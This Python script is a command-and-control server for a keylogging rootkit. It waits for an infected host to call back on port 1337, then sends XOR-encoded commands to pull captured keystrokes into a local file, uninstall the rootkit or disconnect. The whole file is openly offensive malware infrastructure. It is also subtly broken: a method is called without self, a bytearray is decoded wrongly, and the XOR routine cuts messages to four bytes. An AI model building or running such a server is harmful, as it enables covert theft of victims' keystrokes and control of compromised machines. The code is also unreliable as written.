#!/usr/bin/env python3
import socket
import enum
import time

COMMANDS_DICT = {'Collect': '1',
                 'Uninstall': '2',
                 'Disconnect': '3'
                 }

class C2Server:

    def __init__(self):
        self.socket             = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.c2_port            = 1337
        self.key                = b'\xde\xad\xbe\xef'
        self.conn               = None
        self.keylog_filepath    = 'keylog_data'
        self.commands = {
                         '1': self.collect,
                         '2': self.uninstall,
                         '3': self.disconnect
                         }

    @staticmethod
    def menu():
        user_choice = input(
            """
######                                        #     #                      
#     #  ####   ####  ##### #    # # #####    ##   ## ###### #    # #    #
#     # #    # #    #   #   #   #  #   #      # # # # #      ##   # #    #
######  #    # #    #   #   ####   #   #      #  #  # #####  # #  # #    #
#   #   #    # #    #   #   #  #   #   #      #     # #      #  # # #    #
#    #  #    # #    #   #   #   #  #   #      #     # #      #   ## #    # 
#     #  ####   ####    #   #    # #   #      #     # ###### #    #  #### 
            
                        1: Collect Data
                        2: Uninstall Rootkit
                        3: Disconnect C2
:"""
            )
        return user_choice

    def serve(self):
        self.socket.bind(('', self.c2_port))
        self.socket.listen()
        print("Waiting for rootkit callback")
        self.conn, addr = self.socket.accept()
        print("Received callback from rootkit at address: {0}".format(str(addr)))
        with self.conn:
            user_choice = '0'
            done = 0
            while not done:
                while user_choice not in COMMANDS_DICT.values():
                    user_choice = self.menu()
                    print(user_choice)
                self.commands[user_choice]()
                if user_choice in (COMMANDS_DICT['Uninstall'], COMMANDS_DICT['Disconnect']):
                    print("DONE")
                    done = 1

    def collect(self):
        collect_byte = b'\x01'
        rc = self.marshal_and_send(collect_byte, collect_byte)
        if not rc:
            print("Error when collecting keylogged data: invalid ACK received...")
            return rc
        keylog_data = decode_tlv()
        print("Keylog data: {0}".format(keylog_data))
        with open(self.keylog_filepath, 'a') as fp:
            fp.write(keylog_data)
        print("Keylog data successfully written to {0}".format(self.keylog_filepath))
        return True

    def uninstall(self):
        print("Sending uninstall command to rootkit...")
        uninstall_byte = b'\x02'
        rc = self.marshal_and_send(uninstall_byte, uninstall_byte)
        if not rc:
            print("Error when uninstall rootkit: invalid ACK received...")
            return rc
        self.disconnect()
    
    def disconnect(self):
        print("Closing connection...")
        disconnect_byte = b'\x03'
        rc = self.marshal_and_send(disconnect_byte, disconnect_byte, check_ack=False)
        self.socket.shutdown(socket.SHUT_RDWR)
        self.socket.close()

    def marshal_and_send(self, message, ack_byte, check_ack=True):
        encrypted_message = self.crypto(message)
        self.conn.sendall(encrypted_message)
        if not check_ack:
            return True

        ack = self.crypto(self.conn.recv(1))
        if ack[0].to_bytes(1, byteorder='big') != ack_byte:
            print("Error with ack byte. Received: {0}, Expected: {1}".format(ack[0].to_bytes(1, byteorder='big'), ack_byte))
            return False
        return True

    def crypto(self, message):
        message = bytearray(message)
        final = bytearray()
        for i, j in zip(message, self.key):
            final.append(i ^ j)
        return final

    def decode_tlv(self, tlv):
        length = int.from_bytes(self.conn.recv(4), byteorder='big', signed=False)
        encrypted_message = self.conn.recv(length)
        bytes_message = self.crypto(encrypted_message)
        return bytes_message.encode('utf-8')


if __name__ == "__main__":
    c2 = C2Server()
    c2.serve()
